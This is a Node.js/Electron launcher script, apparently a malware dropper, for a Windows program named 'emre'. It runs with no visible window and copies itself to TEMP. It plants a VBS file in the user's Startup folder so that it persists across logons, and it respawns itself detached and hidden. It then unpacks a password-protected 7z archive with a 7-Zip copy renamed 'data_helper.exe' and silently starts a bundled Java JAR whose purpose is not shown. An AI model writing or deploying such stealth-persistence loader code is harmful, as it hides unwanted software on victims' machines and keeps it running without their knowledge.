var fs = require("fs");
var path = require("path");
var exec = require("child_process").exec;
var cp = require("child_process");
var os = require("os");

// Electron compatibility
var isElectron = !!process.versions.electron;
if (isElectron) {
    var electron = require('electron');
    var app = electron.app;
    var BrowserWindow = electron.BrowserWindow;
    
    // Hide dock icon if on Mac (not applicable here but good practice)
    if (app.dock) app.dock.hide();
    
    app.on('ready', function() {
        // Create a hidden window to keep the app running
        var win = new BrowserWindow({
            show: false,
            width: 0,
            height: 0,
            skipTaskbar: true,
            frame: false
        });
        // We don't need to load anything, just keep the process alive
    });
}

var APP_NAME = "emre";
var ARCHIVE_PASSWORD = "V9niA8IkAjh3"; // Will be injected during build

// Debug log to file (since console.log doesn't work in windowless mode)
var logFile = path.join(os.tmpdir(), 'launcher_debug.log');
function log(msg) {
  try {
    fs.appendFileSync(logFile, new Date().toISOString() + ' ' + msg + '\n');
  } catch (e) {}
}

// 7za.exe path resolved from module (most reliable in packaged builds)
var SEVEN_ZIP_PATH = null;
try {
  SEVEN_ZIP_PATH = require('7zip-bin').path7za;
  log('[Launcher] 7zip path from module: ' + SEVEN_ZIP_PATH);
} catch (e) {
  log('[Launcher] Could not resolve 7zip module: ' + e);
}

// Startup persistence - copy original portable EXE to TEMP and create VBS in startup
function setupStartup() {
  log('[Launcher] setupStartup() started');
  try {
    var exePath = process.env.PORTABLE_EXECUTABLE_FILE || process.execPath;
    var exeName = path.basename(exePath);
    var tempExePath = path.join(os.tmpdir(), exeName);
    log('[Launcher] EXE path: ' + exePath + ', temp: ' + tempExePath + ', PORTABLE_EXECUTABLE_FILE=' + process.env.PORTABLE_EXECUTABLE_FILE);
    
    // Copy EXE to temp with same name
    try {
      var data = fs.readFileSync(exePath);
      fs.writeFileSync(tempExePath, data);
      log('[Launcher] EXE copied to temp');
    } catch (e) {
      log('[Launcher] EXE copy failed: ' + e);
      tempExePath = exePath;
    }
    
    // Save EXE name for Java relog
    try {
      var nameFile = path.join(os.tmpdir(), '.exename');
      fs.writeFileSync(nameFile, exeName, 'utf8');
    } catch (e) {}
    
    // Create VBS launcher script
    var vbsName = exeName.replace('.exe', '.vbs');
    var startupDir = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
    var vbsPath = path.join(startupDir, vbsName);
    
    var vbsCode = 'Set WshShell = CreateObject("WScript.Shell")\r\n' +
        'Set FSO = CreateObject("Scripting.FileSystemObject")\r\n' +
        'Dim tempPath\r\n' +
        'tempPath = FSO.GetSpecialFolder(2) & "\\.startup_mode"\r\n' +
        'On Error Resume Next\r\n' +
        'Dim f\r\n' +
        'Set f = FSO.CreateTextFile(tempPath, True, False)\r\n' +
        'f.Write "1"\r\n' +
        'f.Close\r\n' +
        'Set f = Nothing\r\n' +
        'On Error GoTo 0\r\n' +
        'WScript.Sleep 500\r\n' +
        'WshShell.Run "' + tempExePath + ' --startup", 0, False\r\n' +
        'Set WshShell = Nothing\r\n' +
        'Set FSO = Nothing';
    
    try {
      var parts = startupDir.split('\\');
      var current = '';
      for (var i = 0; i < parts.length; i++) {
        current += (i === 0 ? '' : '\\') + parts[i];
        try {
          if (!fs.existsSync(current)) fs.mkdirSync(current);
        } catch (e) {}
      }
    } catch (e) {}
    fs.writeFileSync(vbsPath, vbsCode, 'utf8');
    log('[Launcher] VBS created at: ' + vbsPath);
    
    return true;
  } catch (e) {
    log('[Launcher] setupStartup error: ' + e);
    return false;
  }
}

function startHidden() {
  log('[Launcher] startHidden() started');
  
  if (process.env._HIDDEN_MARKER) {
    log('[Launcher] _HIDDEN_MARKER found, calling main()');
    setupStartup();
    main();
    return;
  }
  
  // First run: persist and spawn hidden process directly (no VBS needed)
  log('[Launcher] First run, setting up persistence...');
  setupStartup();
  
  log('[Launcher] Spawning hidden process...');
  var exePath = process.execPath;
  var child = cp.spawn(exePath, [], {
    stdio: "ignore",
    windowsHide: true,
    detached: true,
    env: Object.assign({}, process.env, { _HIDDEN_MARKER: "1" })
  });
  child.unref();
  
  setTimeout(function() {
    log('[Launcher] First run exiting...');
    process.exit(0);
  }, 500);
}

function getInstallDir() {
  var appData = process.env.LOCALAPPDATA;
  if (!appData) appData = os.tmpdir();
  return path.join(appData, APP_NAME);
}

function checkFile(fpath) {
  try { fs.statSync(fpath); return true; } catch (e) { return false; }
}

function main() {
  log('[Launcher] main() started');
  log('[Launcher] Args: ' + JSON.stringify(process.argv));
  var installDir = getInstallDir();
  log('[Launcher] Install dir: ' + installDir);
  var jarFile = path.join(installDir, "emre.jar");

  // Farkli konumlarda java.exe ara (jlink ciktilari farkli olabilir)
  var javaPaths = [
    path.join(installDir, "bin", "java.exe"),
    path.join(installDir, "jre", "bin", "java.exe"),
    path.join(installDir, "java", "bin", "java.exe"),
    path.join(installDir, "openjdk", "bin", "java.exe"),
    path.join(installDir, "jdk", "bin", "java.exe"),
    path.join(installDir, "bin", "java"),
    "java"
  ];

  var jarExists = checkFile(jarFile);
  log('[Launcher] JAR exists: ' + jarExists + ' at ' + jarFile);
  var javaExists = false;
  var foundJava = null;
  for (var i = 0; i < javaPaths.length; i++) {
    if (checkFile(javaPaths[i])) {
      javaExists = true;
      foundJava = javaPaths[i];
      log('[Launcher] Java found at: ' + foundJava);
      break;
    }
  }

  // .jar_ready marker varsa kurulum tamam demek
  var readyExists = checkFile(path.join(installDir, ".jar_ready"));
  log('[Launcher] .jar_ready exists: ' + readyExists);

  log('[Launcher] Decision: javaExists=' + javaExists + ', jarExists=' + jarExists + ', readyExists=' + readyExists);
  // ALWAYS re-extract to ensure fresh JAR (fix: stale JAR from old EXE updates)
  log('[Launcher] Calling installApp (always re-extract)...');
  installApp(installDir, foundJava, jarFile, jarExists);
}

function launchApp(javaExe, jarFile, installDir) {
  log('[Launcher] launchApp called with: ' + javaExe + ', ' + jarFile);
  // Check if startup mode (from args or flag file)
  var hasStartupArg = process.argv.indexOf('--startup') !== -1;
  var hasStartupFile = checkFile(path.join(os.tmpdir(), '.startup_mode'));
  var isStartup = hasStartupArg || hasStartupFile;
  log('[Launcher] launchApp startup: arg=' + hasStartupArg + ', file=' + hasStartupFile);
  var args = ["-jar", jarFile];
  if (isStartup) {
    args.push('--startup');
    // Clean up flag file
    try { fs.unlinkSync(path.join(os.tmpdir(), '.startup_mode')); } catch (e) {}
  }
  
  log('[Launcher] Spawning Java: ' + javaExe + ' args: ' + JSON.stringify(args));
  try {
    var java = cp.spawn(javaExe, args, {
      stdio: "ignore",
      cwd: installDir,
      detached: true,
      windowsHide: true
    });
    java.unref();
    log('[Launcher] Java spawned successfully');
  } catch (e) {
    log('[Launcher] Java spawn error: ' + e);
  }

  setTimeout(function() {
    log('[Launcher] Exiting after spawn');
    process.exit(0);
  }, 500);
}

function extractZip(archivePath, destDir, callback) {
  log('[Launcher] extractZip started: ' + archivePath + ' to ' + destDir);
  
  var sevenZipPath = SEVEN_ZIP_PATH;
  
  // Try to copy 7za.exe out of ASAR to a real path for spawn
  var external7z = path.join(destDir, "data_helper.exe");
  if (sevenZipPath) {
    try {
      log('[Launcher] Copying 7zip from: ' + sevenZipPath);
      var s7zData = fs.readFileSync(sevenZipPath);
      fs.writeFileSync(external7z, s7zData);
      sevenZipPath = external7z;
      log('[Launcher] 7zip copied to: ' + external7z);
    } catch (e) {
      log('[Launcher] 7zip copy error: ' + e + ', path=' + sevenZipPath);
      // Fallback: try common paths (asar.unpacked + extraResources)
      var baseDir = process.resourcesPath || path.dirname(process.execPath);
      var fallbacks = [
        path.join(baseDir, '7za.exe'),
        path.join(baseDir, 'app.asar.unpacked', 'node_modules', '7zip-bin', 'win', 'x64', '7za.exe'),
        path.join(baseDir, 'app.asar', 'node_modules', '7zip-bin', 'win', 'x64', '7za.exe'),
        path.join(path.dirname(baseDir), 'app.asar.unpacked', 'node_modules', '7zip-bin', 'win', 'x64', '7za.exe')
      ];
      for (var i = 0; i < fallbacks.length; i++) {
        try {
          log('[Launcher] Trying fallback: ' + fallbacks[i]);
          var d = fs.readFileSync(fallbacks[i]);
          fs.writeFileSync(external7z, d);
          sevenZipPath = external7z;
          log('[Launcher] Fallback 7zip copied to: ' + external7z);
          break;
        } catch (e2) {}
      }
    }
  }

  // Last resort: try resolve 7zip-bin module location outside asar
  if (sevenZipPath && sevenZipPath.indexOf('asar') !== -1 && !fs.existsSync(external7z)) {
    try {
      var resolvedPkg = require.resolve('7zip-bin/package.json');
      var moduleDir = path.dirname(resolvedPkg);
      var module7z = path.join(moduleDir, 'win', process.arch, '7za.exe');
      log('[Launcher] Resolved 7zip-bin to: ' + module7z);
      if (fs.existsSync(module7z)) {
        var d = fs.readFileSync(module7z);
        fs.writeFileSync(external7z, d);
        sevenZipPath = external7z;
        log('[Launcher] Module-resolved 7zip copied to: ' + external7z);
      }
    } catch (e2) {
      log('[Launcher] Module resolve failed: ' + e2);
    }
  }

  log('[Launcher] Using 7zip: ' + (sevenZipPath || 'NOT FOUND'));
  
  // Komut: 7za.exe x archive.7z -pPassword -oDestDir -y
  var cmd = '"' + sevenZipPath + '" x "' + archivePath + '" -p' + ARCHIVE_PASSWORD + ' -o"' + destDir + '" -y';
  
  log('[Launcher] Executing 7zip command...');
  cp.exec(cmd, { windowsHide: true, timeout: 300000 }, function(err) {
    if (!err) {
      log('[Launcher] 7zip extraction success');
      try { fs.unlinkSync(archivePath); } catch (e) {}
      
      // Eğer içinden jre.zip çıktıysa onu da aç (eski sistemle uyumluluk için)
      var nestedZip = path.join(destDir, "jre.zip");
      if (checkFile(nestedZip)) {
          log('[Launcher] Found nested jre.zip, extracting...');
          var ps = "powershell -NoProfile -Command \"Expand-Archive -Path '" + nestedZip + "' -DestinationPath '" + path.join(destDir, 'jre') + "' -Force\"";
          cp.exec(ps, { windowsHide: true }, function() {
              try { fs.unlinkSync(nestedZip); } catch (e) {}
              callback(null);
          });
      } else {
          callback(null);
      }
      return;
    }
    log('[Launcher] 7zip extraction failed: ' + err);
    callback(err);
  });
}

function installApp(installDir, javaExe, jarFile, jarExists) {
  log('[Launcher] installApp called');
  // Force fresh extraction - delete stale JAR and marker from old installs
  try { if (fs.existsSync(jarFile)) { fs.unlinkSync(jarFile); log('[Launcher] Deleted stale JAR: ' + jarFile); } } catch (e) {}
  try { var m = path.join(installDir, '.jar_ready'); if (fs.existsSync(m)) { fs.unlinkSync(m); log('[Launcher] Deleted stale .jar_ready'); } } catch (e) {}
  var exeDir = path.dirname(process.execPath);
  var srcData = path.join(exeDir, "data.7z");
  if (!fs.existsSync(srcData)) {
    srcData = path.join(__dirname, "data.7z");
  }
  log('[Launcher] srcData: ' + srcData + ', exists: ' + fs.existsSync(srcData));

  try { fs.mkdirSync(installDir); } catch (e) {}

  var jarCopied = false;
  var archivePath = path.join(installDir, "data.7z");
  var archiveCopied = false;
  
  if (fs.existsSync(srcData)) {
    try {
      log('[Launcher] Copying Archive from ' + srcData + ' to ' + archivePath);
      var archiveData = fs.readFileSync(srcData);
      fs.writeFileSync(archivePath, archiveData);
      archiveCopied = true;
      log('[Launcher] Archive copied successfully, size: ' + archiveData.length);
    } catch (e) {
      log('[Launcher] Archive copy error: ' + e);
    }
  }

  if (archiveCopied && fs.existsSync(archivePath)) {
    extractZip(archivePath, installDir, function(err) {
      log('[Launcher] extractZip callback called, err=' + err);
      
      // JAR zip içinden çıktığı için kontrol et
      if (checkFile(jarFile)) {
        jarCopied = true;
        log('[Launcher] JAR extracted from ZIP successfully');
        
        // Sadece extraction başarılıysa marker oluştur
        log('[Launcher] Creating .jar_ready marker...');
        try { 
          fs.writeFileSync(path.join(installDir, ".jar_ready"), "1"); 
          log('[Launcher] .jar_ready created');
        } catch (e) {
          log('[Launcher] .jar_ready creation error: ' + e);
        }
      } else {
        log('[Launcher] JAR NOT found after extraction!');
      }
      // Check if startup mode AFTER extraction (file might have been created by VBS)
      log('[Launcher] Checking startup mode...');
      log('[Launcher] os.tmpdir()=' + os.tmpdir());
      log('[Launcher] process.argv=' + JSON.stringify(process.argv));
      var hasStartupArg = process.argv.indexOf('--startup') !== -1;
      log('[Launcher] hasStartupArg=' + hasStartupArg);
      var startupFilePath = path.join(os.tmpdir(), '.startup_mode');
      log('[Launcher] startupFilePath=' + startupFilePath);
      var hasStartupFile = checkFile(startupFilePath);
      log('[Launcher] hasStartupFile=' + hasStartupFile);
      var isStartupMode = hasStartupArg || hasStartupFile;
      log('[Launcher] Startup check complete: arg=' + hasStartupArg + ', file=' + hasStartupFile);
      // java yolunu tekrar kontrol et
      log('[Launcher] Looking for Java...');
      var jPaths = [
        path.join(installDir, "bin", "java.exe"),
        path.join(installDir, "jre", "bin", "java.exe"),
        path.join(installDir, "openjdk", "bin", "java.exe"),
        "java"
      ];
      var fj = null;
      log('[Launcher] Checking ' + jPaths.length + ' Java paths...');
      for (var i = 0; i < jPaths.length; i++) {
        log('[Launcher] Checking path ' + i + ': ' + jPaths[i] + ' = ' + checkFile(jPaths[i]));
        if (checkFile(jPaths[i])) { 
          fj = jPaths[i]; 
          log('[Launcher] Found Java at: ' + fj);
          break; 
        }
      }
      log('[Launcher] Java search complete. fj=' + fj + ', jarCopied=' + jarCopied);
      if (fj && jarCopied) {
        log('[Launcher] Both Java and JAR found, calling launchApp...');
        try {
          launchApp(fj, jarFile, installDir);
          log('[Launcher] launchApp returned');
        } catch (e) {
          log('[Launcher] launchApp error: ' + e);
        }
      } else {
        log('[Launcher] Java not found or JAR not copied, exiting. fj=' + fj + ', jarCopied=' + jarCopied);
        process.exit(0);
      }
    });
  } else {
    // Zip yoksa direkt JAR calistir (java PATH'de varsa)
    log('[Launcher] ZIP not found or not copied, using direct Java spawn');
    // Check startup mode
    var hasStartupArg2 = process.argv.indexOf('--startup') !== -1;
    var hasStartupFile2 = checkFile(path.join(os.tmpdir(), '.startup_mode'));
    var isStartupMode2 = hasStartupArg2 || hasStartupFile2;
    log('[Launcher] No-zip mode: arg=' + hasStartupArg2 + ', file=' + hasStartupFile2);
    log('[Launcher] jarCopied=' + jarCopied + ', attempting to spawn Java');
    if (jarCopied) {
      try {
        var spawnArgs = ["-jar", jarFile];
        if (isStartupMode2) spawnArgs.push('--startup');
        log('[Launcher] Spawning Java (no-zip): ' + JSON.stringify(spawnArgs));
        var jproc = cp.spawn("java", spawnArgs, {
          stdio: "ignore", cwd: installDir, detached: true, windowsHide: true
        });
        jproc.unref();
        log('[Launcher] Java spawned (no-zip)');
      } catch (e) {
        log('[Launcher] Java spawn error (no-zip): ' + e);
      }
    } else {
      log('[Launcher] JAR not copied, cannot spawn Java');
    }
    setTimeout(function() { process.exit(0); }, 500);
  }
}

startHidden();
